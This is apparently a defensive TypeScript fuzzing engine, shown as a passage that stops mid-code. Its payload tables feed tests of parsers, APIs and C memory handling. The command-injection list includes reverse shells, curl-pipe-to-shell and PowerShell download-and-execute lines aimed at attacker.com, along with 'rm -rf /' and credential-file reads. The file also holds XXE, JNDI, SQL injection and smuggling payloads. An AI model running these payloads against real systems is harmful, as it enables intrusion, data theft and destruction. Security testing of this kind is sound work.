// ============================================================
// Secure Fuzz Analysis Engine — Production-Grade Fuzzer
// ============================================================
// Defensive fuzz testing for REST, GraphQL, JSON, XML, parsers,
// serialization, regex, CLIs, and more.
// Captures crashes, panics, exceptions, memory exhaustion, timeouts.
// Features:
//   - 25+ fuzz strategies with real, usable input generators
//   - Coverage-guided smart mutation engine
//   - Delta-debugging crash minimizer
//   - Deterministic crash deduplication via computed signatures
// ============================================================

import { createHash } from 'node:crypto';
import { logger } from '../utils/logger.js';

// ---- Types ----

export interface FuzzTarget {
  type: 'rest_api' | 'graphql' | 'soap' | 'json_parser' | 'xml_parser' |
        'file_parser' | 'cli_parser' | 'config_parser' | 'serialization' |
        'deserialization' | 'regex' | 'input_validation' | 'auth_workflow' | 'custom';
  spec?: Record<string, unknown>;
  url?: string;
  method?: string;
  headers?: Record<string, string>;
  filePath?: string;
  functionName?: string;
}

export interface FuzzStrategy {
  name: string;
  description: string;
  category: 'boundary' | 'malformed' | 'overflow' | 'injection' | 'encoding' |
            'structure' | 'logic' | 'resource';
  generator: (seed: unknown) => unknown;
}

export interface FuzzCase {
  iteration: number;
  strategy: string;
  input: unknown;
  inputSize: number;
  mutatedFrom?: string;
}

export interface FuzzResult {
  iteration: number;
  strategy: string;
  input: unknown;
  crashDetected: boolean;
  crashType?: string;
  crashSignature?: string;
  exceptionDetected: boolean;
  exceptionType?: string;
  timeoutDetected: boolean;
  exitCode?: number;
  signalNumber?: number;
  executionTimeMs: number;
  output?: string;
  errorOutput?: string;
  stackTrace?: string;
  memoryUsageBytes?: number;
}

export interface CoverageMap {
  [file: string]: {
    [line: string]: number;
  };
}

export interface CrashData {
  crashType: string;
  signalNumber?: number;
  exitCode?: number;
  stackTrace?: string;
  exceptionType?: string;
  input: unknown;
}

export interface MutationResult {
  mutatedInput: unknown;
  expectedCoverageDelta: number;
}

// ============================================================
// BOUNDARY & EDGE-CASE VALUE TABLES
// ============================================================

/** Full integer boundary table: signed and unsigned variants for 8/16/32/64-bit. */
const INTEGER_BOUNDARIES: unknown[] = [
  // int8
  -128, -127, -1, 0, 1, 126, 127,
  // uint8
  0, 1, 254, 255,
  // int16
  -32768, -32767, -129, 128, 32766, 32767,
  // uint16
  0, 1, 65534, 65535,
  // int32
  -2147483648, -2147483647, -32769, 32768, 2147483646, 2147483647,
  // uint32
  0, 1, 4294967294, 4294967295,
  // int64 (BigInt)
  -9223372036854775808n, -9223372036854775807n, -2147483649n,
  2147483648n, 9223372036854775806n, 9223372036854775807n,
  // uint64 (BigInt)
  0n, 1n, 18446744073709551614n, 18446744073709551615n,
  // JavaScript safe integers
  Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER,
  Number.MAX_VALUE, Number.MIN_VALUE,
  // Classic boundary patterns
  -0, 0.0, -0.0,
  '', ' ', '\n', '\t', '\r', '\0',
  'A'.repeat(1), 'A'.repeat(100), 'A'.repeat(10000), 'A'.repeat(1000000),
  null, undefined,
  true, false,
  [], {}, new Date(),
];

/** Extended Unicode payloads including homoglyphs, confusables, and bidi overrides. */
const UNICODE_PAYLOADS_EXTENDED: string[] = [
  // Original payloads
  '\x00',           // Null byte
  '\x01',           // SOH
  '\x1F',           // Unit separator
  '\x7F',           // DEL
  '\x80',           // First beyond ASCII
  '\xFF',           // Latin-1 supplement
  'Ā',         // First 2-byte
  '￿',         // Max BMP
  '\uD800',         // High surrogate (alone — invalid!)
  '\uDC00',         // Low surrogate (alone — invalid!)
  '�',         // Replacement character
  '﻿',         // BOM (ZWNBS)
  '​',         // Zero-width space
  '‎',         // LTR mark
  '‏',         // RTL mark
  '‮',         // RTL override
  '⁦',         // LTR isolate
  '⁧',         // RTL isolate
  '⁨',         // First strong isolate
  '⁩',         // Pop directional isolate
  '\\u0000',        // Escaped null
  '\\x00',          // Hex null
  '%00',            // URL-encoded null
  '␀',         // Null symbol
  '𝄞',   // 4-byte (astral) — musical symbol G clef
  '🏴‍☠️', // ZWJ sequence + emoji
  '̀̀̀', // Stacking combining marks
  // New: confusables / homoglyphs
  'а',         // Cyrillic 'а' (confusable with Latin 'a')
  'е',         // Cyrillic 'е' (confusable with Latin 'e')
  'о',         // Cyrillic 'о' (confusable with Latin 'o')
  'р',         // Cyrillic 'р' (confusable with Latin 'p')
  'с',         // Cyrillic 'с' (confusable with Latin 'c')
  'ѕ',         // Cyrillic 'ѕ' (confusable with Latin 's')
  '­',         // Soft hyphen (invisible)
  '͏',         // Combining grapheme joiner (invisible)
  '؜',         // Arabic letter mark (bidi)
  '‪',         // LTR embedding
  '‫',         // RTL embedding
  '‬',         // Pop directional formatting
  '⁠',         // Word joiner
  '⁡',         // Function application
  '⁢',         // Invisible times
  '⁣',         // Invisible separator
  '⁤',         // Invisible plus
  '᠎',         // Mongolian vowel separator
  ' ',         // Non-breaking space
  ' ',         // Ogham space mark
  ' ',         // En quad
  ' ',         // Em quad
  ' ',         // En space
  ' ',         // Em space
  ' ',         // Three-per-em space
  ' ',         // Four-per-em space
  ' ',         // Six-per-em space
  ' ',         // Figure space
  ' ',         // Punctuation space
  ' ',         // Thin space
  ' ',         // Hair space
  ' ',         // Line separator
  ' ',         // Paragraph separator
  '﻿',         // Zero-width no-break space (BOM)
  '￹',         // Interlinear annotation anchor
  '￺',         // Interlinear annotation separator
  '￻',         // Interlinear annotation terminator
  // Homoglyph sequences that could bypass filters
  'раураl',         // "paypal" in Cyrillic homoglyphs
  'fасеbооk',       // "facebook" in Cyrillic homoglyphs
  'gооglе',         // "google" in Cyrillic homoglyphs
  '‮Upload',   // RTL override + text (bidi attack)
  '‮evitca',   // RTL override can reverse word
];

/** Format string payloads with positional patterns and width specifiers. */
const FORMAT_STRING_PAYLOADS_EXTENDED: string[] = [
  // Original payloads
  '%s', '%n', '%x', '%p', '%d', '%f',
  '%s%s%s%s%s%s%s%s%s%s',
  '%x%x%x%x%x%x%x%x%x%x',
  '%n%n%n%n%n%n%n%n%n%n',
  '%.1000s', '%.1000x',
  '%9999999999s',
  // New: positional format strings
  '%1$s', '%1$n', '%1$x', '%1$p', '%1$d',
  '%1$s%2$s%3$s%4$s%5$s',
  '%1$n%2$n%3$n%4$n%5$n',
  '%1$s %2$s %3$s %4$s %5$s',
  '%1$.*2$d',               // Positional width from argument
  '%1$*2$.*3$f',            // Positional width and precision
  '%1$s%2$n%1$s%2$n',      // Interleaved positional read/write
  // Width specifier combinations
  '% 10d', '%010d', '%-10d', '%+10d',
  '% 10s', '%-10s', '%.10s', '%10.10s',
  '%*.*d', '%*.*s', '%*.*f',
  '%10$d', '%100$d', '%1000$d',  // Deep positional
  '%1$hhn', '%1$hn', '%1$n',    // Write-size variants
  '%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p',  // Stack leak
  // Narrow vs wide
  '%lc', '%ls', '%C', '%S',
  // Half / double precision (non-standard but seen in practice)
  '%Lf', '%hf',
];

const SQL_INJECTION_PAYLOADS: string[] = [
  "'", "''", "' OR '1'='1", "'; DROP TABLE users; --",
  "' UNION SELECT NULL, NULL, NULL--",
  "admin'--", "1' OR 1=1 --", "' AND 1=0 UNION SELECT 1,2,3--",
  "'; EXEC sp_configure 'xp_cmdshell', 1;--",
  "' /*", "'--", "';--", "' OR 1=1--",
  "' OR '1'='1' --", "' OR '1'='1' #",
  "1' ORDER BY 1--", "1' ORDER BY 2--",
  "' UNION SELECT @@version--",
  "' UNION SELECT column_name FROM information_schema.columns--",
  "'; WAITFOR DELAY '00:00:10'--",
  "' OR SLEEP(10)--",
];

const COMMAND_INJECTION_PAYLOADS: string[] = [
  '; ls -la', '| cat /etc/passwd', '`id`', '$(whoami)',
  '& dir C:\\', '&& ping -c 1 127.0.0.1', '|| echo pwned',
  '\nwhoami\n', '| shutdown /s /t 0',
  ';id;', '|id|', '\nid\n', '`id`',
  '$(cat /etc/passwd)', '${IFS}id',
  '; rm -rf /', '| nc attacker.com 1337',
  '$(curl attacker.com/script.sh | sh)',
  '`curl attacker.com/script.sh | sh`',
  '| powershell -c "Invoke-Expression (Invoke-WebRequest attacker.com/script.ps1)"',
  '& whoami & echo', '| nc -e /bin/sh attacker.com 1337',
];

const XML_PAYLOADS: string[] = [
  '<!--', '-->', '<![CDATA[', ']]>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<x/><x/>', '<<<>>>', '<x y="z">',
  '<x>' + 'A'.repeat(100000) + '</x>',
  '<xml xmlns="urn:"><![CDATA[<script>alert(1)</script>]]></xml>',
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]>',
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>',
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>',
  '<?xml version="1.0" standalone="no"?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>',
  '<!DOCTYPE foo [<!ENTITY xxe "file:///etc/passwd">]>',
  '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>',
];

const JSON_PAYLOADS: unknown[] = [
  '{}', '[]', '""', 'null', 'true', 'false',
  '{"__proto__": {"isAdmin": true}}',
  '{"constructor": {"prototype": {"isAdmin": true}}}',
  '{"$where": "1==1"}',
  '{"$gt": ""}',
  '{"$regex": ".*"}',
  '{"a": ' + '1'.repeat(10000) + '}',
  '{"' + 'a'.repeat(10000) + '": 1}',
  '[' + '1,'.repeat(10000) + '1]',
  '{"a": NaN}',
  '{"a": Infinity}',
  '{"a": -Infinity}',
  '/* comment */ {"a": 1}',
  '{"a": 1} // comment',
  '[1,2,3,4,5,6,7,8,9,10,\n' + '  "a", true, null, {}, []]',
  '{"\\u0041": 1}',     // Escaped unicode key
  '{"a\\tb": 1}',        // Tab in key
  '{"a\\nb": 1}',        // Newline in key
  '﻿{"a":1}',       // BOM before JSON
  '{"a":1}\0',           // Null after JSON
];

const REGEX_PAYLOADS: string[] = [
  '', '.', '.*', '.*.*', '(.*)+', '(.*)*', '(a+)+',
  '(a|b)*', '(a|aa)+', '([a-zA-Z]+)*',
  '(a?){100}', '(a|aa){100}',
  '(a|b|ab)*c', '(?:[a-zA-Z0-9]+)*x{100}',
  '\\b\\b', '^.*$', '\\d+\\D+\\w+\\W+\\s+\\S+',
  'A'.repeat(100), 'A'.repeat(10000),
  '(x+)+y', '(a|)+$', '(a|b?){100}',
  '((?s:.)*)', '(?:a*)*', '(a|b)*(a|b)*',
  '(.?){1000}', '(?=.*a)(?=.*b)(?=.*c)',
  '\\w+(?=\\s)', '\\b(?=[a-z])(?![0-9])\\w+\\b',
];

const PATH_TRAVERSAL_PAYLOADS: string[] = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\win.ini',
  '....//....//....//etc/passwd',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252F..%252F..%252Fetc/passwd',
  '/etc/passwd',
  'C:\\Windows\\System32\\drivers\\etc\\hosts',
  'file:///etc/passwd',
  '.../.../.../etc/passwd',
  '....\\....\\....\\etc\\passwd',
  '..;/..;/..;/etc/passwd',
  '..%c0%af..%c0%af..%c0%afetc/passwd',   // UTF-8 overlong
  '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
  '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',  // Fullwidth slash
];

// ============================================================
// NEW DEDICATED PAYLOAD TABLES
// ============================================================

const DOUBLE_FREE_PATTERNS: string[] = [
  // Repeated free/delete call sequences
  'free(p); free(p);',
  'delete p; delete p;',
  'delete[] p; delete[] p;',
  'fclose(f); fclose(f);',
  'free(p); p = NULL; free(p);',           // Double free via reassign (still UAF)
  '// same pointer freed in two paths\nif (cond) { free(p); }\nelse { free(p); }',
  'free(p);\n// ...\nfree(p); // freed again',
  'g_free(p); g_free(p);',
  'cfree(p); cfree(p);',
  'realloc(p, 0); realloc(p, 0);',         // realloc(ptr, 0) is free on some impls
  'free(p);\nfree(q); // where p == q',
  'for (int i=0; i<2; i++) { free(arr[i]); }', // Same pointer in array twice
  'free(p);\nif (p) { free(p); }',           // Null check after free - still wrong
  'free(p);\nfree((void*)((uintptr_t)p & ~0xF));', // Page-aligned double free
];

const USE_AFTER_FREE_PATTERNS: string[] = [
  // Access patterns after release
  'free(p);\nprintf("%s", p->data);',
  'delete p;\np->method();',
  'fclose(f);\nfread(buf, 1, 100, f);',
  'free(p);\nmemcpy(p, src, 100);',
  'free(p);\nreturn p->value;',
  'free(p);\nstrlen(p->name);',
  'delete[] p;\np[0] = \'x\';',
  'free(p);\nif (p->flag) { ... }',
  'free(p);\nsprintf(buf, "%p", p);',       // Format freed pointer value
  'free(p);\nmutex_lock(&p->lock);',          // Access lock in freed memory
  'free(p);\n(*callback)(p->data);',          // Callback through freed memory
  'free(p->child);\nfree(p);\nuse(p->child);', // Use after free of child after parent freed
  'realloc(p, 0);\np[0] = (char)0;',
  'g_free(p);\ng_object_ref(p);',            // Glib object after free
];

// Off-by-N values covering range from off-by-1 through off-by-1024
function generateOffByNValues(): number[] {
  const values: number[] = [];
  // Systematic off-by-1, off-by-2, off-by-3... up to off-by-1024 (powers of 2)
  for (const n of [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15, 16, 31, 32, 63, 64,
                    127, 128, 255, 256, 511, 512, 1023, 1024]) {
    values.push(n, -n);
  }
  return values;
}

const OFF_BY_N_VALUES: number[] = generateOffByNValues();

// Integer wraparound values for systematic testing
const INTEGER_WRAPAROUND_VALUES: (number | bigint)[] = [
  // int8
  -128, -129, 127, 128,
  // uint8
  0, -1, 255, 256,
  // int16
  -32768, -32769, 32767, 32768,
  // uint16
  0, -1, 65535, 65536,
  // int32
  -2147483648, -2147483649, 2147483647, 2147483648,
  // uint32
  0, -1, 4294967295, 4294967296,
  // int64 (BigInt)
  -9223372036854775808n, -9223372036854775809n, 9223372036854775807n, 9223372036854775808n,
  // uint64 (BigInt)
  0n, -1n, 18446744073709551615n, 18446744073709551616n,
  // JavaScript number wraparounds
  Number.MAX_SAFE_INTEGER + 1, Number.MAX_SAFE_INTEGER + 2,
  Number.MIN_SAFE_INTEGER - 1, Number.MIN_SAFE_INTEGER - 2,
  0xFFFFFFFF + 1,  // Overflow to 2^32
  0xFFFFFFFF >>> 0, // 32-bit unsigned wraparound
  // Arithmetic overflow patterns
  Number.MAX_VALUE * 2,
  Number.MAX_VALUE * Number.MAX_VALUE,
  -Number.MAX_VALUE * 2,
];

// Floating-point edge cases
const FLOATING_POINT_EDGES: number[] = [
  NaN,
  Number.NaN,
  Infinity,
  +Infinity,
  -Infinity,
  0,
  -0,
  Number.EPSILON,
  -Number.EPSILON,
  Number.MAX_VALUE,
  -Number.MAX_VALUE,
  Number.MIN_VALUE,
  -Number.MIN_VALUE,
  Number.MAX_SAFE_INTEGER,
  Number.MIN_SAFE_INTEGER,
  0.0000000000001,   // Very small positive
  -0.0000000000001,  // Very small negative
  1e-324,            // Denormalized (subnormal) — smallest positive
  -1e-324,           // Denormalized negative
  2.225073858507201e-308,  // Min normal positive double
  -2.225073858507201e-308, // Min normal negative double
  1.7976931348623157e+308,  // Max double
  -1.7976931348623157e+308, // Min double
  0.1 + 0.2,          // Classic precision issue (0.30000000000000004)
  0.1 * 0.1,          // Precision issue
  1.0 / 0.0,          // Division by zero -> Infinity
  -1.0 / 0.0,         // -> -Infinity
  0.0 / 0.0,          // -> NaN
  Math.sqrt(-1),      // -> NaN
  Math.log(0),        // -> -Infinity
  Math.log(-1),       // -> NaN
  Math.pow(0, 0),     // 1 but edge case
  Math.pow(Infinity, 0), // 1 but edge case
  0.0, -0.0, +0.0,
];

// Encoding stacking payloads
function generateEncodingStack(): string[] {
  const layers: string[] = [];
  const innerPayloads = [
    '<script>alert(1)</script>',
    '../../../etc/passwd',
    "' OR '1'='1",
    '${jndi:ldap://attacker.com/a}',
    '<![CDATA[<>]]>',
  ];

  for (const payload of innerPayloads) {
    // base64 -> url
    const b64 = Buffer.from(payload, 'utf-8').toString('base64');
    layers.push(btoa(encodeURIComponent(payload)));
    // url -> base64 -> url
    layers.push(encodeURIComponent(btoa(payload)));
    // base64 -> url -> base64
    layers.push(btoa(encodeURIComponent(btoa(payload))));
    // triple stack: base64(url(base64(payload)))
    layers.push(btoa(encodeURIComponent(btoa(encodeURIComponent(payload)))));
    // Hex -> base64 -> url
    const hexPayload = Buffer.from(payload, 'utf-8').toString('hex');
    layers.push(btoa(hexPayload));
    // Unicode escape stacking
    layers.push(payload.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''));
    // HTML entity stacking on top
    layers.push(payload.split('').map(c => '&#' + c.charCodeAt(0) + ';').join(''));
  }
  return layers;
}

const ENCODING_STACK_PAYLOADS: string[] = generateEncodingStack();

// Billion laughs / entity expansion bomb
function generateBillionLaughs(): string {
  const entities: string[] = [];
  entities.push('<?xml version="1.0"?>');
  entities.push('<!DOCTYPE lolz [');

  // Classic billion laughs: entity expansion
  // lol9 expands to 10 copies of lol8, which expands to 10 copies of lol7, etc.
  // Total expansion: 10^9 = 1,000,000,000 entities
  // We'll use a smaller depth for practical fuzzing
  entities.push('  <!ENTITY lol "lol">');
  let prev = 'lol';
  for (let i = 1; i <= 12; i++) {
    const name = `lol${i}`;
    entities.push(`  <!ENTITY ${name} "${prev}${prev}${prev}${prev}${prev}${prev}${prev}${prev}${prev}${prev}">`);
    prev = name;
  }
  entities.push(']>');
  entities.push('<lolz>&lol12;</lolz>');
  return entities.join('\n');
}

// YAML-based billion laughs
function generateYamlBillionLaughs(): string {
  const lines: string[] = [];
  lines.push('a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]');
  for (let i = 1; i <= 9; i++) {
    const prevName = String.fromCharCode(96 + i); // `a`, `b`, `c`, ...
    const thisName = String.fromCharCode(97 + i);
    lines.push(`${thisName}: &${thisName} [*${prevName}, *${prevName}, *${prevName}, *${prevName}, *${prevName}, *${prevName}, *${prevName}, *${prevName}, *${prevName}, *${prevName}]`);
  }
  lines.push('final: *j');
  return lines.join('\n');
}

// ============================================================
// FUZZ STRATEGIES
// ============================================================

export const FUZZ_STRATEGIES: FuzzStrategy[] = [
  // ==================================================================
  // 1.  boundary-integers — expanded with int8/16/32/64 + unsigned
  // ==================================================================
  {
    name: 'boundary-integers',
    description: 'Test integer boundary values including int8/16/32/64 signed and unsigned variants',
    category: 'boundary',
    generator: (_seed: unknown) => {
      const i = Math.floor(Math.random() * INTEGER_BOUNDARIES.length);
      return INTEGER_BOUNDARIES[i];
    },
  },

  // ==================================================================
  // 2.  unicode-edge-cases — expanded with homoglyphs, bidi, confusables
  // ==================================================================
  {
    name: 'unicode-edge-cases',
    description: 'Test Unicode edge cases including surrogates, BOM, control chars, homoglyphs, bidi overrides, confusables',
    category: 'encoding',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * UNICODE_PAYLOADS_EXTENDED.length);
      return UNICODE_PAYLOADS_EXTENDED[idx];
    },
  },

  // ==================================================================
  // 3.  format-strings — expanded with positional %n$s and width specifiers
  // ==================================================================
  {
    name: 'format-strings',
    description: 'Test format string vulnerabilities with positional patterns and width specifiers',
    category: 'injection',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * FORMAT_STRING_PAYLOADS_EXTENDED.length);
      return FORMAT_STRING_PAYLOADS_EXTENDED[idx];
    },
  },

  // ==================================================================
  // 4.  oversized-inputs
  // ==================================================================
  {
    name: 'oversized-inputs',
    description: 'Test behavior with extremely large inputs',
    category: 'overflow',
    generator: (_seed: unknown) => {
      const sizes = [1000, 10000, 100000, 1000000, 10000000];
      const size = sizes[Math.floor(Math.random() * sizes.length)];
      return 'A'.repeat(size);
    },
  },

  // ==================================================================
  // 5.  nested-structures
  // ==================================================================
  {
    name: 'nested-structures',
    description: 'Test deeply nested data structures',
    category: 'structure',
    generator: (_seed: unknown) => {
      const depth = Math.floor(Math.random() * 2000) + 10;
      let obj = '{"a": 1}';
      for (let i = 0; i < depth && i < 100; i++) {
        obj = `{"nested": ${obj}}`;
      }
      return JSON.parse(obj);
    },
  },

  // ==================================================================
  // 6.  random-bytes
  // ==================================================================
  {
    name: 'random-bytes',
    description: 'Test with completely random byte sequences',
    category: 'malformed',
    generator: (_seed: unknown) => {
      const length = Math.floor(Math.random() * 10000);
      const bytes = Buffer.alloc(length);
      for (let i = 0; i < length; i++) bytes[i] = Math.floor(Math.random() * 256);
      return bytes.toString('binary');
    },
  },

  // ==================================================================
  // 7.  xml-malformed
  // ==================================================================
  {
    name: 'xml-malformed',
    description: 'Test with malformed and XXE XML',
    category: 'structure',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * XML_PAYLOADS.length);
      return XML_PAYLOADS[idx];
    },
  },

  // ==================================================================
  // 8.  regex-redos
  // ==================================================================
  {
    name: 'regex-redos',
    description: 'Test regex with backtracking-heavy patterns',
    category: 'resource',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * REGEX_PAYLOADS.length);
      return REGEX_PAYLOADS[idx];
    },
  },

  // ==================================================================
  // 9.  path-traversal
  // ==================================================================
  {
    name: 'path-traversal',
    description: 'Test with path traversal sequences including double-encoded and unicode variants',
    category: 'injection',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * PATH_TRAVERSAL_PAYLOADS.length);
      return PATH_TRAVERSAL_PAYLOADS[idx];
    },
  },

  // ==================================================================
  // 10. json-edge-cases
  // ==================================================================
  {
    name: 'json-edge-cases',
    description: 'Test JSON parsers with edge cases including prototype pollution, deep nesting, comments',
    category: 'boundary',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * JSON_PAYLOADS.length);
      return JSON_PAYLOADS[idx];
    },
  },

  // ==================================================================
  // 11. null-byte-injection
  // ==================================================================
  {
    name: 'null-byte-injection',
    description: 'Test with null bytes and truncation',
    category: 'injection',
    generator: (_seed: unknown) => {
      return 'file.txt' + '\0.html' + Math.random().toString(36);
    },
  },

  // ==================================================================
  // 12. type-confusion
  // ==================================================================
  {
    name: 'type-confusion',
    description: 'Test with unexpected types across JS value spectrum',
    category: 'logic',
    generator: (_seed: unknown) => {
      const types = [
        null, undefined, true, false, 0, 1, -1, '', 'string',
        [], [1, 2, 3], {}, { a: 1 }, () => {}, new Date(),
        Symbol('test'), BigInt(99999999999999999999n),
        new RegExp('.*'), new Map(), new Set(), new WeakMap(),
        new WeakSet(), new Error('test'), new Promise(() => {}),
        new Int8Array([1,2,3]), new Uint8Array([1,2,3]),
        new Float64Array([1.1, 2.2]),
      ];
      return types[Math.floor(Math.random() * types.length)];
    },
  },

  // ==================================================================
  // 13. http-smuggling
  // ==================================================================
  {
    name: 'http-smuggling',
    description: 'Test with HTTP request smuggling payloads',
    category: 'structure',
    generator: (_seed: unknown) => {
      const payloads = [
        'GET / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x\r\n\r\n',
        'POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n',
        'GET / HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\n',
        'GET / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n',
        'POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n',
        'GET / HTTP/1.1\r\nHost: x\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x\r\n\r\n',
        'GET / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\n', // Space before colon
      ];
      return payloads[Math.floor(Math.random() * payloads.length)];
    },
  },

  // ==================================================================
  // 14. double-free — NEW
  // ==================================================================
  {
    name: 'double-free',
    description: 'Generate sequences that could trigger double-free (repeated free/delete patterns)',
    category: 'logic',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * DOUBLE_FREE_PATTERNS.length);
      // Wrap in a small compilable snippet
      const snippet = DOUBLE_FREE_PATTERNS[idx];
      return `void test_func() {\n  char *p = (char*)malloc(64);\n  if (!p) return;\n  strcpy(p, "test");\n${snippet}\n}`;
    },
  },

  // ==================================================================
  // 15. use-after-free — NEW
  // ==================================================================
  {
    name: 'use-after-free',
    description: 'Generate access patterns after resource release to trigger UAF',
    category: 'logic',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * USE_AFTER_FREE_PATTERNS.length);
      const pattern = USE_AFTER_FREE_PATTERNS[idx];
      // Generate a C-like snippet that allocates, frees, and then accesses
      return `void test_uaf() {\n  struct { char data[64]; int flag; } *p = malloc(sizeof(*p));\n  if (!p) return;\n  p->flag = 1;\n  strcpy(p->data, "test");\n${pattern}\n}`;
    },
  },

  // ==================================================================
  // 16. buffer-overflow-precise — NEW
  // ==================================================================
  {
    name: 'buffer-overflow-precise',
    description: 'Generate boundary-exact overflows: length+1, length-1, exactly at boundary, length*2',
    category: 'overflow',
    generator: (_seed: unknown) => {
      const baseSizes = [8, 16, 32, 64, 128, 256, 512, 1024, 4096];
      const baseSize = baseSizes[Math.floor(Math.random() * baseSizes.length)];

      // Choose overflow strategy
      const strategies = [
        // Exactly at boundary (within buffer)
        () => `char buf[${baseSize}]; memset(buf, 0, ${baseSize});`,
        // off-by-one: +1
        () => `char buf[${baseSize}]; memset(buf, 0, ${baseSize + 1});`,
        // off-by-one: -1
        () => `char buf[${baseSize}]; memset(buf, 0, ${baseSize - 1});`,
        // Read: exactly boundary + 1 byte read
        () => `char buf[${baseSize}]; buf[${baseSize}] = '\\0';`,  // overflow write
        // Write past boundary by small constant
        () => `char buf[${baseSize}]; for (int i=0; i<=${baseSize}; i++) buf[i] = 'A';`,
        // Write significantly past boundary
        () => `char buf[${baseSize}]; memset(buf, 'A', ${baseSize * 2});`,
        // Copy into buffer of wrong size
        () => `char src[] = "AAAA${'A'.repeat(baseSize)}"; char buf[${baseSize}]; strcpy(buf, src);`,
        // Read overflow
        () => {
          const readSize = baseSize + Math.floor(Math.random() * 64) + 1;
          return `char buf[${baseSize}] = {0}; char result = buf[${readSize}];`;
        },
        // memcpy overflow
        () => `char src[${baseSize * 2}]; memset(src, 'A', ${baseSize * 2}); char dst[${baseSize}]; memcpy(dst, src, ${baseSize * 2});`,
        // sprintf overflow
        () => `char buf[${baseSize}]; sprintf(buf, "${'%s'.repeat(Math.min(baseSize, 20))}", "${'A'.repeat(baseSize * 2)}");`,
        // struct padding overflow via memcpy
        () => `struct { char a[${baseSize}]; int x; } s; char buf[${baseSize + 8}]; memcpy(&s, buf, sizeof(buf));`,
      ];

      const strat = strategies[Math.floor(Math.random() * strategies.length)];
      return `void test_overflow() {\n  ${strat()}\n}`;
    },
  },

  // ==================================================================
  // 17. off-by-n — NEW
  // ==================================================================
  {
    name: 'off-by-n',
    description: 'Generate systematic off-by-2, off-by-3, off-by-N inputs for buffer boundaries',
    category: 'overflow',
    generator: (_seed: unknown) => {
      const n = OFF_BY_N_VALUES[Math.floor(Math.random() * OFF_BY_N_VALUES.length)];
      const baseSize = Math.floor(Math.random() * 1024) + 16;

      // Generate input string that is exactly baseSize + n bytes
      const actualSize = baseSize + n;
      if (actualSize <= 0) {
        return '';
      }

      // Produce a concrete input string of that exact size
      const input = 'X'.repeat(actualSize);

      // Also produce a metadata object describing the off-by-N scenario
      return JSON.stringify({
        type: 'off-by-n',
        baseSize,
        offBy: n,
        actualSize,
        input,
        description: `Input is ${n > 0 ? '+' : ''}${n} bytes ${n > 0 ? 'past' : 'short of'} the ${baseSize}-byte boundary`,
      });
    },
  },

  // ==================================================================
  // 18. toctou — NEW
  // ==================================================================
  {
    name: 'toctou',
    description: 'Generate pairs of inputs designed to exploit Time-of-Check Time-of-Use vulnerabilities',
    category: 'logic',
    generator: (_seed: unknown) => {
      // Generate a TOCTOU scenario description + payload that demonstrates the race
      const scenarios = [
        // File path checks
        {
          check: 'access("/etc/passwd", R_OK)',
          use: 'fopen("/etc/passwd", "r")',
          swap: 'symlink("/tmp/benign", "/etc/passwd") -> symlink("/etc/shadow", "/etc/passwd")',
        },
        {
          check: 'stat(path, &st)',
          use: 'open(path, O_RDONLY)',
          swap: 'Replace file with symlink between check and use',
        },
        {
          check: 'lstat(linkPath, &st)',
          use: 'readlink(linkPath, buf, size)',
          swap: 'Swap link target via rename between check and use',
        },
        // Permission checks
        {
          check: 'access(file, W_OK)',
          use: 'open(file, O_WRONLY)',
          swap: 'Delete file and create symlink to target between check and use',
        },
        // Capability checks
        {
          check: 'getuid() == 0',
          use: 'setuid(0)',
          swap: 'Invoke setuid(0) from non-root between check and use',
        },
        // File existence checks
        {
          check: 'if (exists(lockfile)) { wait(); }',
          use: 'create(lockfile)',
          swap: 'Create lockfile after check passes creating two writers',
        },
        // mkstemp race
        {
          check: 'access(tmpfile, F_OK) == -1',
          use: 'open(tmpfile, O_CREAT|O_EXCL)',
          swap: 'Create symlink at tmpfile path between check and open',
        },
        // Directory traversal validate->use
        {
          check: 'validate_path(user_input)  // checks for ../',
          use: 'open(sanitized_path, O_RDONLY)',
          swap: 'Change directory contents between validate and open',
        },
      ];

      const scenario = scenarios[Math.floor(Math.random() * scenarios.length)];
      return JSON.stringify({
        type: 'toctau',
        vulnerability: 'Time-of-check Time-of-use',
        check: scenario.check,
        use: scenario.use,
